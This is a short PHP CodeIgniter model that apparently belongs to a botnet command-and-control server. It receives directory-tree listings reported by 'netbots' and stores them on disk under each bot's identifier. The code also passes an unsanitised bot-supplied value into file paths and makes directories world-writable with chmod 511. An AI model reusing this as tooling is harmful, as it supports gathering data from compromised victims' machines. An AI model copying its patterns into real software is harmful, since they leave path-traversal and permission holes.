<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed'); 

class Treelist_mdl extends CI_Model {
	
    private $guid;
	  private $pnetbot;
    private $netbots;
    private $json_data;
    private $lastip;
    private $thistime;
    private $tasktype;
    public function __construct()
    {
       parent::__construct();
       $this->guid=$this->bot->guid;
       
       $this->netbots=$this->bot->netbots;
       $this->json_data=$this->bot->json_data;
       $this->lastip=$this->bot->lastip;
       $this->thistime=$this->bot->thistime;
       $this->tasktype=$this->bot->tasktype;
        $this->pnetbot=$this->bot->pnetbot;
       
    }
      
      public function go()
      {
      if($this->pnetbot['code']==1)
      {
       $file_path = $this->config->item('pathlist_path') . '/' . $this->pnetbot['tl_netbot'];
                if (!is_dir($file_path)) {
                    mkdir($file_path);
                    chmod($file_path, 511);
                }
                $file_path = $file_path . '/treelist.txt';
                $treelist_data = $this->pnetbot['data'];
                $treelist_str = $treelist_data;
                write_file($file_path, $treelist_str);
                
                $treelist_data=json_decode($treelist_data,true);
                foreach ($treelist_data as $value) {
                    $path_hash = md5($value['this_path']);
                    $file_path = $this->config->item('pathlist_path') . '/' . $this->pnetbot['tl_netbot'];
                    if (!is_dir($file_path)) {
                        mkdir($file_path);
                        chmod($file_path, 511);
                    }
                    $file_path = $file_path . '/' . $path_hash . '.txt';
                    $path_data = $value['children'];
                    $path_str = json_encode($path_data, JSON_UNESCAPED_UNICODE);
                    write_file($file_path, $path_str);
                }
       }
  	   return true;
      }
      

}